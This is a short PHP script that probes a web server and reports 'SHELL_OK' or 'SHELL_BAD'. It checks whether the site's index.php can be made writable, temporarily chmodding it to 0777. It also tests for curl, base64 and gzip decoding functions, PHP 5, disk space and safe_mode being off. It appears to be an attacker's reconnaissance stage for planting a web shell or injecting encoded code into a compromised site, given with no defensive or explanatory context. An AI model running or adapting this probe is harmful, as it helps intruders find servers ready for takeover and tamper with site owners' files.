<?php

$minSpace = 5000000;
$index = $_SERVER['DOCUMENT_ROOT'] . '/index.php';

$indexWritable = is_writable($index);

if (! $indexWritable) {
	$oldPerms = fileperms($index) & 0777;
	chmod($index, 0777);
	$indexWritable = is_writable($index);
	chmod($index, $oldPerms);
}

$data = array(
	'json_decode' => function_exists('json_decode'),
	'curl_init' => function_exists('curl_init'),
	'base64_decode' => function_exists('base64_decode'),
	'gzuncompress' => function_exists('gzuncompress'),
	'phpok' => 5 == substr(phpversion(), 0, 1),
	'has_space' => max(disk_free_space(dirname(__FILE__)) , disk_free_space('/tmp/')) > $minSpace,
	'index_writable' => $indexWritable && filesize($index) > 5,
	'safe_mode_off' => ! ini_get('safe_mode')
);

$ok = $data['json_decode'] &&
	$data['curl_init'] &&
	$data['base64_decode'] &&
	$data['gzuncompress'] &&
	$data['phpok'] &&
	$data['has_space'] &&
	$data['index_writable'] &&
	$data['safe_mode_off'];

echo '<pre>';
echo $ok ? "SHELL_OK" : "SHELL_BAD";
echo "\n";

print_r($data);